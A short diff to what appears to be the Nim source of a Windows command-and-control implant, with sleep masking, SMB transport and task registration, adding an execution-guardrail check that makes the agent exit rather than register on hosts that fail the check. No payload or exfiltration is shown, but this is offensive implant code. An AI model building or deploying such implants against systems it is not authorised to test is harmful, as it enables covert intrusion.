@@ -1,6 +1,6 @@
 import winim/lean
 import times, system, random, strformat, tables
-import utils/[io, metadata]
+import utils/[io, metadata, guardrail]
 import core/[context, sleepmask, exit, transport, job]
 import core/transport/smb
 import protocol/[task, result, registration]
@@ -15,11 +15,12 @@ proc agentMain() =
     if ctx == nil: 
         quit(0)
 
-    # Retrieve agent metadata
+    # Check guardrails 
     let metadata = ctx.collectAgentMetadata()
-    
-    # Check guardrails
-    
+    if not checkGuardrails(ctx.guardrails, metadata):
+        print protect("[*] Execution guardrails prevented agent from registering.")
+        print protect("[*] Exiting.")
+        exit()
 
     #[
         Agent routine: 
